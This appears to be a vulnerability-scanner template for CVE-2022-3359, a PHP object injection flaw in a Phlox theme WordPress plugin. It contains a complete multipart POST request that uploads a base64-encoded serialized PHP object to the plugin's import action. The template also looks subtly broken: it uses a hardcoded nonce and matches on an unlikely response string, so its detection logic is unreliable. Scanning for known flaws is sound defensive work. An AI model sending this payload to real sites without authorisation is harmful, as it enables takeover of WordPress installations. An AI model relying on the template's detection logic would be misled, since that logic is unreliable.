id: CVE-2022-3359

info:
  name: PHP Object Injection in Phlox Theme WordPress Plugin
  author: ProjectDiscoveryAI
  severity: high
  description: The Shortcodes and extra features for Phlox theme WordPress plugin before 2.10.7 unserializes the content of an imported file, which could lead to PHP object injection.
  impact: |
    Remote code execution leading to complete compromise of the WordPress site.
  remediation: |
    Update to the latest version of Phlox Theme WordPress Plugin to mitigate CVE-2022-3359.
  reference:
    - https://wpscan.com/vulnerability/08f3ce22-94a0-496a-aaf9-d35b6b0f5bb6
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2022-3359
    epss-score: 0.00201
    epss-percentile: 0.58825
    cpe: cpe:2.3:a:averta:shortcodes_and_extra_features_for_phlox_theme:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: averta
    product: shortcodes_and_extra_features_for_phlox_theme
    framework: wordpress
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    headers:
      Content-Type: multipart/form-data; boundary=---------------------------311648694729615030513398536822

    body: |
      -----------------------------311648694729615030513398536822
      Content-Disposition: form-data; name="file"; filename="import.txt"
      Content-Type: text/plain

      Tzo0OiJFdmlsIjowOnt9Ow==
      -----------------------------311648694729615030513398536822
      Content-Disposition: form-data; name="action"

      auxin_customizer_import
      -----------------------------311648694729615030513398536822
      Content-Disposition: form-data; name="nonce"

      3da8669d7a
      -----------------------------311648694729615030513398536822--
    matchers:
      - type: word
        words:
          - "Arbitrary deserialization"
        part: body
